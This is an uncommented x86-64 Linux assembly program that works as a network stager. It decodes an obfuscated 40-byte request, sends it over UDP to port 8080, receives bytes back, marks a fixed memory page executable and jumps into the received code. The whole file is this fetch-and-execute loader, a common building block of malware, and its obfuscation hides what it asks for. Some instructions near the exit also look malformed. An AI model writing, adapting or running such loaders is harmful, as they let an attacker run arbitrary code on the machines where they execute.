	.section .data

req:	.int 0x26617050,0x61a026d6,0x37d62161,0x84f437c6,0x6313d2a0
	.int 0xd2e22687,0xa2e23212,0x876313d2,0x27a727a7,0x84f484f4

	.section .text

	.globl _start

_start:
	addq	$0xffffffffffffff60,%rsp
	xorl	%ecx,%ecx
	jmp	.L0
.L1:
	leaq	req,%r8
	addq	%rcx,%r8
	movb	(%r8),%r9b
	movb	%r9b,%r10b
	shlb	$4,%r10b
	shrb	$4,%r9b
	orb	%r10b,%r9b
	xorb	$0x42,%r9b
	movb	%r9b,(%r8)
	addl	$1,%ecx
.L0:
	cmp	$0x28,%ecx
	jl	.L1
	movl	$0x29,%eax
	movl	$0x2,%edi
	movl	$0x1,%esi
	xorl	%edx,%edx
	syscall
	test	%eax,%eax
	je	.L2
	movl	%eax,0x98(%rsp)
	xorq	%rax,%rax
	movq	%rax,0x80(%rsp)
	movq	%rax,0x88(%rsp)
	movw	$0x2,0x80(%rsp)
	movw	$0x901f,0x82(%rsp)
	movl	$0x2a,%eax
	movl	0x98(%rsp),%edi
	leaq	0x80(%rsp),%rsi
	movl	$0x10,%edx
	syscall
	cmp	$0xffffffff,%eax
	je	.L3
	movl	$0x2c,%eax
	movl	0x98(%rsp),%edi
	leaq	req,%rsi
	movq	$0x28,%rdx
	xorl	%r10d,%r10d
	leaq	0x80(%rsp),%r8
	movl	$0x10,%r9d
	syscall
	cmp	$0x28,%eax
	jne	.L3
	movl	$0x2d,%eax
	movl	0x98(%rsp),%edi
	leaq	(%rsp),%rsi
	movq	$0x4c,%rdx
	xorl	%r10d,%r10d
	leaq	0x80(%rsp),%r8
	movl	$0x10,%r9d
	syscall
	movl	$0x2d,%eax
	movl	0x98(%rsp),%edi
	leaq	0x4d(%rsp),%rsi
	movq	$0x31,%rdx
	xorl	%r10d,%r10d
	leaq	0x80(%rsp),%r8
	movl	$0x10,%r9d
	syscall
.L3:
	movl	$0x3,%eax
	movl	0x98(%rsp),%edi
	syscall
	movl	$0xa,%eax
	movl	$0x401000,%edi
	movl	$0x1000,%esi
	movl	$7,%edx
	syscall
	movl	$0x31,%ecx
	leaq	0x4d(%rsp),%rsi
	movl	$0x401a00,%edi
	rep movsb
	movl	$0x401a00,%eax
	call	*%rax
.L2:
	xorl	%edi,%edi
	addq	$0xa0,%rsp
	popq	%rsp
	movl	$0x3c,%eax
	syscall
